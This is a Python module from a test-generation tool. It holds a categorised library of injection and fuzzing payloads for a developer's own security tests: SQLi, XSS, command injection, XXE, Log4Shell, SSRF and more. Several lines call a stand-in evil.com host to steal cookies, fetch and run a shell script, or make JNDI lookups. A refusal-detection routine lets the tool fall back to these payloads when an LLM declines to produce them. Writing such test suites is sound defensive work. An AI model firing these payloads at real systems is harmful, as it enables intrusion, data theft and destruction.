"""
LLM Security Engine: Security context from structured JSON spec → creative security strings.
Generates SQLi, XSS, buffer overflow, command injection, SSTI, NoSQL injection,
LDAP injection, XXE, CRLF, CSV injection, path traversal, and many more
security-relevant test inputs.

The fallback payload library is comprehensive and data-type-aware, so even
without the LLM the engine produces powerful, categorised test vectors.
"""

import json
import logging
import re
from typing import Any, Dict, List

logger = logging.getLogger(__name__)

try:
    from nlp_testgen.llm.generate import generate_text
    LLM_AVAILABLE = True
except Exception:
    LLM_AVAILABLE = False
    generate_text = None


# ── Categorised payload library ──────────────────────────────────────────────
# Each entry: (value, sub_category, severity)
# severity: "critical" | "high" | "medium" | "low"

_SQL_INJECTION: List[tuple] = [
    ("' OR '1'='1",                          "sqli_tautology",        "critical"),
    ("' OR '1'='1' --",                      "sqli_tautology",        "critical"),
    ("' OR '1'='1' /*",                      "sqli_tautology",        "critical"),
    ("1; DROP TABLE users--",                "sqli_destructive",      "critical"),
    ("'; EXEC xp_cmdshell('dir');--",        "sqli_command_exec",     "critical"),
    ("1 UNION SELECT * FROM users",          "sqli_union",            "critical"),
    ("1 UNION SELECT NULL,NULL,NULL--",      "sqli_union",            "critical"),
    ("admin'--",                             "sqli_auth_bypass",      "critical"),
    ("' OR 1=1 LIMIT 1 --",                 "sqli_auth_bypass",      "critical"),
    ("1' AND 1=1--",                         "sqli_boolean_blind",    "high"),
    ("1' AND 1=2--",                         "sqli_boolean_blind",    "high"),
    ("1' AND SLEEP(5)--",                    "sqli_time_blind",       "high"),
    ("1'; WAITFOR DELAY '0:0:5'--",          "sqli_time_blind",       "high"),
    ("1' ORDER BY 1--",                      "sqli_enumeration",      "high"),
    ("1' ORDER BY 100--",                    "sqli_enumeration",      "high"),
    ("' HAVING 1=1--",                       "sqli_error_based",      "high"),
    ("' GROUP BY columnnames HAVING 1=1--",  "sqli_error_based",      "high"),
    ("1; UPDATE users SET role='admin'--",   "sqli_privilege_esc",    "critical"),
    ("'; SHUTDOWN--",                        "sqli_destructive",      "critical"),
    ("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                                             "sqli_info_disclosure",  "high"),
]

_XSS: List[tuple] = [
    ("<script>alert(1)</script>",                            "xss_basic",           "critical"),
    ("<script>alert(document.cookie)</script>",              "xss_cookie_steal",    "critical"),
    ("<img src=x onerror=alert(1)>",                         "xss_event_handler",   "critical"),
    ("<svg onload=alert(1)>",                                "xss_svg",             "high"),
    ("<body onload=alert(1)>",                               "xss_body_event",      "high"),
    ("javascript:alert(1)",                                  "xss_protocol",        "high"),
    ("<iframe src='javascript:alert(1)'>",                   "xss_iframe",          "high"),
    ("<img src=x onerror=fetch('https://evil.com/'+document.cookie)>",
                                                             "xss_exfiltration",    "critical"),
    ("'\"><script>alert(1)</script>",                        "xss_breakout",        "critical"),
    ("<details open ontoggle=alert(1)>",                     "xss_html5",           "high"),
    ("<marquee onstart=alert(1)>",                           "xss_legacy_tag",      "medium"),
    ("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
                                                             "xss_mutation",        "high"),
    ("{{constructor.constructor('return this')()}}", "xss_prototype",       "high"),
]

_COMMAND_INJECTION: List[tuple] = [
    ("; ls -la",                      "cmdi_semicolon",       "critical"),
    ("| cat /etc/passwd",             "cmdi_pipe",            "critical"),
    ("&& whoami",                     "cmdi_and",             "critical"),
    ("$(whoami)",                      "cmdi_substitution",    "critical"),
    ("`id`",                           "cmdi_backtick",        "critical"),
    ("|| ping -c 5 127.0.0.1",        "cmdi_or",              "high"),
    ("; curl https://evil.com/shell.sh | bash", "cmdi_download_exec", "critical"),
    ("%0als",                          "cmdi_newline_encoded", "high"),
    ("input\nid",                      "cmdi_newline",         "high"),
]

_PATH_TRAVERSAL: List[tuple] = [
    ("../../../etc/passwd",            "path_trav_unix",       "critical"),
    ("..\\..\\..\\windows\\system.ini", "path_trav_windows",   "critical"),
    ("....//....//....//etc/passwd",   "path_trav_double",     "high"),
    ("/etc/passwd%00.jpg",             "path_trav_null_byte",  "critical"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",   "path_trav_url_enc",    "high"),
    ("..%252f..%252f..%252fetc%252fpasswd", "path_trav_double_enc", "high"),
    ("file:///etc/passwd",             "path_trav_file_proto", "high"),
]

_SSTI: List[tuple] = [
    ("{{7*7}}",                        "ssti_jinja2",          "critical"),
    ("${7*7}",                         "ssti_freemarker",      "critical"),
    ("#{7*7}",                         "ssti_ruby_erb",        "critical"),
    ("{{config}}",                     "ssti_config_leak",     "critical"),
    ("{{self.__init__.__globals__}}",   "ssti_python_globals",  "critical"),
    ("<%= 7*7 %>",                     "ssti_erb",             "high"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "ssti_class_chain", "critical"),
]

_NOSQL_INJECTION: List[tuple] = [
    ('{"$gt": ""}',                    "nosqli_gt_bypass",     "critical"),
    ('{"$ne": null}',                  "nosqli_ne_bypass",     "critical"),
    ('{"$regex": ".*"}',               "nosqli_regex",         "high"),
    ("true, $where: '1 == 1'",         "nosqli_where",         "critical"),
    ('{"$or": [{"a": 1}, {"b": 1}]}',  "nosqli_or",           "critical"),
    ("admin'; return true; var a='",   "nosqli_js_inject",     "critical"),
]

_LDAP_INJECTION: List[tuple] = [
    ("*)(objectClass=*",               "ldapi_wildcard",       "high"),
    ("admin)(|(password=*))",          "ldapi_filter_bypass",  "critical"),
    ("*)(uid=*))(|(uid=*",             "ldapi_nested",         "high"),
]

_XXE: List[tuple] = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                                       "xxe_file_read",        "critical"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
                                       "xxe_ssrf",             "critical"),
    ('<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
                                       "xxe_dos",              "high"),
]

_CRLF: List[tuple] = [
    ("%0d%0aSet-Cookie:hacked=true",   "crlf_header_inject",   "high"),
    ("header\r\nInjected-Header: val", "crlf_raw",             "high"),
    ("%0d%0aContent-Length:0",         "crlf_smuggling",       "high"),
]

_CSV_INJECTION: List[tuple] = [
    ("=cmd|'/C calc'!A0",             "csv_cmd_exec",         "critical"),
    ("+cmd|'/C calc'!A0",             "csv_plus_trigger",     "high"),
    ("-cmd|'/C calc'!A0",             "csv_minus_trigger",    "high"),
    ("@SUM(1+1)*cmd|'/C calc'!A0",   "csv_at_trigger",       "high"),
    ("=HYPERLINK(\"http://evil.com\")", "csv_hyperlink",       "medium"),
]

_LOG_INJECTION: List[tuple] = [
    ("${jndi:ldap://evil.com/a}",      "log4shell",            "critical"),
    ("${jndi:dns://evil.com}",         "log4shell_dns",        "critical"),
    ("${jndi:rmi://evil.com/exploit}", "log4shell_rmi",        "critical"),
    ("${env:AWS_SECRET_ACCESS_KEY}",   "log_env_leak",         "high"),
    ("${sys:os.name}",                 "log_sys_info",         "medium"),
]

_SSRF: List[tuple] = [
    ("http://169.254.169.254/latest/meta-data/", "ssrf_cloud_metadata",  "critical"),
    ("http://127.0.0.1:22",            "ssrf_localhost",       "high"),
    ("http://[::1]",                   "ssrf_ipv6_localhost",  "high"),
    ("http://0x7f000001",              "ssrf_hex_ip",          "high"),
    ("http://0177.0.0.1",              "ssrf_octal_ip",        "high"),
    ("gopher://127.0.0.1:25/",         "ssrf_gopher",          "high"),
    ("dict://127.0.0.1:6379/info",     "ssrf_dict_redis",      "high"),
]

_DESERIALIZATION: List[tuple] = [
    ("O:8:\"stdClass\":0:{}",          "deser_php",            "critical"),
    ("rO0ABXNyA...",                   "deser_java_magic",     "critical"),
    ('{"__proto__":{"isAdmin":true}}', "prototype_pollution",  "critical"),
    ("cos\nsystem\n(S'id'\ntR.",       "deser_python_pickle",  "critical"),
]

_OVERFLOW_SPECIAL: List[tuple] = [
    ("A" * 500,                        "buffer_overflow",      "high"),
    ("A" * 5000,                       "buffer_overflow_large", "high"),
    ("%s%s%s%s%s%s%s%s%s%s",           "format_string",        "critical"),
    ("%x%x%x%x%x",                    "format_string_hex",    "high"),
    ("%n%n%n%n%n",                     "format_string_write",  "critical"),
]

_SPECIAL_VALUES: List[tuple] = [
    ("\0",                              "null_byte",            "high"),
    ("",                                "empty_input",          "medium"),
    (" ",                               "whitespace_only",      "low"),
    ("\t\n\r",                          "control_chars",        "medium"),
    ("null",                            "literal_null_str",     "medium"),
    ("undefined",                       "literal_undefined",    "medium"),
    ("NaN",                             "literal_nan",          "medium"),
    ("true",                            "literal_boolean",      "low"),
    ("None",                            "literal_none",         "low"),
]

_NUMERIC_ATTACKS: List[tuple] = [
    ("-1",                              "negative_number",      "medium"),
    ("0",                               "zero",                 "low"),
    ("99999999999999999999",            "integer_overflow",     "high"),
    ("-99999999999999999999",           "integer_underflow",    "high"),
    ("2147483647",                      "int32_max",            "high"),
    ("-2147483648",                     "int32_min",            "high"),
    ("9007199254740992",                "js_max_safe_int_plus", "high"),
    ("1e308",                           "float_overflow",       "high"),
    ("-1e308",                          "float_underflow",      "high"),
    ("1e-324",                          "float_denorm",         "medium"),
    ("Infinity",                        "infinity",             "medium"),
    ("-Infinity",                       "neg_infinity",         "medium"),
    ("0.1+0.2",                         "float_precision",      "low"),
    ("0x41",                            "hex_value",            "low"),
    ("0b1010",                          "binary_value",         "low"),
    ("0o17",                            "octal_value",          "low"),
    ("1/0",                             "division_by_zero",     "medium"),
]

_UNICODE_ATTACKS: List[tuple] = [
    ("é",                               "unicode_accented",     "low"),
    ("你好",                            "unicode_cjk",          "low"),
    ("🔥💀",                            "unicode_emoji",        "low"),
    ("\u202Eabc",                       "unicode_rtl_override", "high"),
    ("\uFEFF",                          "unicode_bom",          "medium"),
    ("Ā" * 300,                         "unicode_long_multi",   "medium"),
    ("\u0000",                          "unicode_null",         "high"),
    ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "unicode_xss_escape", "high"),
]

_AUTH_BYPASS: List[tuple] = [
    ("admin",                           "auth_default_user",    "medium"),
    ("administrator",                   "auth_admin",           "medium"),
    ("root",                            "auth_root",            "medium"),
    ("password",                        "auth_default_pass",    "medium"),
    ("' OR ''='",                       "auth_sqli_empty",      "critical"),
    ("admin@evil.com",                  "auth_email_spoof",     "high"),
]


# ── Data-type routing ────────────────────────────────────────────────────────
# For each data type we choose an appropriate mix of categories.

_STRING_CATEGORIES = [
    _SQL_INJECTION, _XSS, _COMMAND_INJECTION, _PATH_TRAVERSAL,
    _SSTI, _NOSQL_INJECTION, _LDAP_INJECTION, _XXE, _CRLF,
    _CSV_INJECTION, _LOG_INJECTION, _SSRF, _DESERIALIZATION,
    _OVERFLOW_SPECIAL, _SPECIAL_VALUES, _UNICODE_ATTACKS, _AUTH_BYPASS,
]

_INTEGER_CATEGORIES = [
    _NUMERIC_ATTACKS, _SQL_INJECTION[:5], _SPECIAL_VALUES,
]

_FLOAT_CATEGORIES = [
    _NUMERIC_ATTACKS, _SPECIAL_VALUES,
]

# One flat default list for backward compatibility and "unknown" types
_ALL_CATEGORIES = (
    _SQL_INJECTION + _XSS + _COMMAND_INJECTION + _PATH_TRAVERSAL +
    _SSTI + _NOSQL_INJECTION + _LDAP_INJECTION + _XXE + _CRLF +
    _CSV_INJECTION + _LOG_INJECTION + _SSRF + _DESERIALIZATION +
    _OVERFLOW_SPECIAL + _SPECIAL_VALUES + _NUMERIC_ATTACKS +
    _UNICODE_ATTACKS + _AUTH_BYPASS
)


def _flatten(categories: list) -> List[tuple]:
    """Flatten a list of category lists into a single list of tuples."""
    out = []
    for cat in categories:
        if isinstance(cat, list):
            for item in cat:
                if isinstance(item, tuple):
                    out.append(item)
                elif isinstance(item, list):
                    out.extend(item)
        elif isinstance(cat, tuple):
            out.append(cat)
    return out


def _payloads_for_type(data_type: str) -> List[tuple]:
    """Return the right payload mix based on the requirement's data type."""
    dt = (data_type or "string").lower()
    if dt in ("integer", "int", "number"):
        return _flatten(_INTEGER_CATEGORIES)
    if dt in ("float", "double", "decimal"):
        return _flatten(_FLOAT_CATEGORIES)
    if dt == "string":
        return _flatten(_STRING_CATEGORIES)
    # Unknown type → send everything
    return list(_ALL_CATEGORIES)


# ── LLM refusal detection ────────────────────────────────────────────────────

def _is_llm_refusal(response: str) -> bool:
    """Detect when the LLM refused to generate security payloads (safety/ethics refusal)."""
    if not response or len(response.strip()) < 10:
        return True
    refusal_phrases = [
        "can't generate", "cannot generate", "i can't", "i cannot",
        "unable to generate", "won't generate", "will not generate",
        "designed to exploit", "i'm not able", "i am not able",
        "don't generate", "do not generate", "refuse", "cannot provide",
        "can not provide", "against my", "against our", "harmful",
        "malicious", "used by attackers", "not appropriate", "ethical",
        "i apologize", "i'm sorry", "i am sorry", "safety reasons",
        "responsible disclosure",
    ]
    lower = response.lower()
    return any(p in lower for p in refusal_phrases)


# ── JSON extraction helper ────────────────────────────────────────────────────

def _extract_json_array(response: str) -> List[str]:
    try:
        # Try to find [...] in response
        match = re.search(r'\[[\s\S]*?\]', response)
        if match:
            arr = json.loads(match.group(0))
            if isinstance(arr, list):
                return [str(x) for x in arr]
        return json.loads(response.strip())
    except (json.JSONDecodeError, TypeError):
        # Line-by-line quoted strings
        lines = [s.strip().strip('"').strip("'") for s in response.splitlines() if s.strip()]
        return lines[:30]
    return []


# ── Main entry point ──────────────────────────────────────────────────────────

def get_creative_security_strings(spec: Dict[str, Any], max_strings: int = 25) -> List[Dict[str, Any]]:
    """
    From structured JSON spec (security context: data_type, constraints, raw requirement),
    produce creative security test strings via LLM (or comprehensive fallback library).

    Returns list of:
        {"value": str, "label": str, "category": str, "severity": str, "type": "security"}

    The fallback library covers 15+ attack categories with 80+ payloads, selected
    based on the requirement's data type.
    """
    raw = spec.get("raw", "")
    data_type = (spec.get("data_type") or "string").lower()
    constraints = spec.get("constraints") or []

    # ── Try LLM first ────────────────────────────────────────────────────
    if LLM_AVAILABLE and generate_text:
        try:
            prompt = f"""<|begin_of_text|><|start_header_id|>system<|end_header_id|>
You are a senior application-security engineer producing test inputs for a
developer's own automated test suite. The goal is to uncover injection flaws,
boundary errors, and input-validation gaps. Output ONLY a JSON array of objects.

Each object must have:
  "value"    – the raw test input string
  "category" – one of: sqli, xss, cmdi, path_traversal, ssti, nosqli, ldapi,
                xxe, crlf, csv_injection, log_injection, ssrf, deserialization,
                overflow, format_string, unicode, auth_bypass, numeric
  "severity" – one of: critical, high, medium, low

Requirement: {raw}
Data type: {data_type}. Constraints: {constraints}

Return EXACTLY a JSON array with {max_strings} objects. No markdown, no explanation.<|eot_id|>
<|start_header_id|>user<|end_header_id|>
JSON array of security test inputs only.<|eot_id|>
<|start_header_id|>assistant<|end_header_id|>"""
            response = generate_text(
                prompt,
                max_tokens=1200,
                temperature=0.8,
            )
            if _is_llm_refusal(response):
                logger.info("LLM declined security payloads; using comprehensive fallback library")
            else:
                # Try structured parse (array of objects)
                arr = _try_parse_structured(response)
                if arr and len(arr) >= 2:
                    logger.info(f"LLM produced {len(arr)} structured security test vectors")
                    return arr[:max_strings]
                # If structured parse failed, DO NOT use line-by-line junk.
                # Fall through to the powerful built-in library instead.
                logger.info("LLM output was not clean JSON; using comprehensive fallback library")
        except Exception as e:
            logger.warning(f"LLM security engine failed: {e}, using fallback")

    # ── Fallback: comprehensive built-in library ─────────────────────────
    return _build_fallback(data_type, max_strings)


def _try_parse_structured(response: str) -> List[Dict[str, Any]]:
    """Try to parse the LLM response as a JSON array of objects with value/category/severity.
    
    Handles common LLM quirks: markdown fences, trailing commas, incomplete arrays.
    """
    if not response:
        return []

    # Strip markdown code fences if present
    cleaned = response.strip()
    cleaned = re.sub(r'^```(?:json)?\s*', '', cleaned)
    cleaned = re.sub(r'\s*```$', '', cleaned)
    cleaned = cleaned.strip()

    # Strategy 1: Direct parse of the whole response
    parsed = _try_json_parse_array(cleaned)
    if parsed:
        return parsed

    # Strategy 2: Find the outermost [...] using bracket matching
    start_idx = cleaned.find('[')
    if start_idx != -1:
        depth = 0
        end_idx = -1
        for i in range(start_idx, len(cleaned)):
            if cleaned[i] == '[':
                depth += 1
            elif cleaned[i] == ']':
                depth -= 1
                if depth == 0:
                    end_idx = i
                    break
        if end_idx != -1:
            bracket_content = cleaned[start_idx:end_idx + 1]
            parsed = _try_json_parse_array(bracket_content)
            if parsed:
                return parsed

    # Strategy 3: Find individual JSON objects line by line
    objects = []
    for match in re.finditer(r'\{[^{}]*\}', cleaned):
        try:
            obj = json.loads(match.group(0))
            if isinstance(obj, dict) and 'value' in obj:
                objects.append(obj)
        except (json.JSONDecodeError, TypeError):
            continue
    if objects:
        return _normalize_objects(objects)

    return []


def _try_json_parse_array(text: str) -> List[Dict[str, Any]]:
    """Try to parse text as a JSON array, with cleanup for common LLM issues."""
    # Try direct parse
    try:
        arr = json.loads(text)
        if isinstance(arr, list) and len(arr) > 0 and isinstance(arr[0], dict):
            return _normalize_objects(arr)
    except (json.JSONDecodeError, TypeError):
        pass

    # Fix trailing commas: ,] -> ]  and ,} -> }
    fixed = re.sub(r',\s*\]', ']', text)
    fixed = re.sub(r',\s*\}', '}', fixed)
    try:
        arr = json.loads(fixed)
        if isinstance(arr, list) and len(arr) > 0 and isinstance(arr[0], dict):
            return _normalize_objects(arr)
    except (json.JSONDecodeError, TypeError):
        pass

    # Try adding a missing closing bracket
    if text.strip().startswith('[') and not text.strip().endswith(']'):
        try:
            # Remove any trailing comma and incomplete object
            trimmed = re.sub(r',?\s*\{[^}]*$', '', text.strip())
            trimmed = re.sub(r',\s*$', '', trimmed) + ']'
            arr = json.loads(trimmed)
            if isinstance(arr, list) and len(arr) > 0 and isinstance(arr[0], dict):
                return _normalize_objects(arr)
        except (json.JSONDecodeError, TypeError):
            pass

    return []


def _normalize_objects(objects: list) -> List[Dict[str, Any]]:
    """Normalize a list of parsed JSON objects into our standard format."""
    out = []
    for item in objects:
        if not isinstance(item, dict):
            continue
        val = item.get("value", "")
        out.append({
            "value": str(val),
            "label": item.get("category", "security"),
            "category": item.get("category", "security"),
            "severity": item.get("severity", "high"),
            "type": "security",
        })
    return out


def _build_fallback(data_type: str, max_strings: int) -> List[Dict[str, Any]]:
    """Build the fallback test vector list from the categorised payload library."""
    payloads = _payloads_for_type(data_type)

    # Deduplicate by value
    seen = set()
    unique: List[tuple] = []
    for p in payloads:
        val = p[0]
        if val not in seen:
            seen.add(val)
            unique.append(p)

    out = []
    for value, sub_category, severity in unique[:max_strings]:
        if isinstance(value, str) and len(value) > 1000:
            value = value[:1000] + "..."
        out.append({
            "value": value if isinstance(value, str) else str(value),
            "label": sub_category,
            "category": sub_category,
            "severity": severity,
            "type": "security",
        })

    logger.info(
        f"Security engine produced {len(out)} test vectors "
        f"(data_type={data_type}, fallback=True)"
    )
    return out
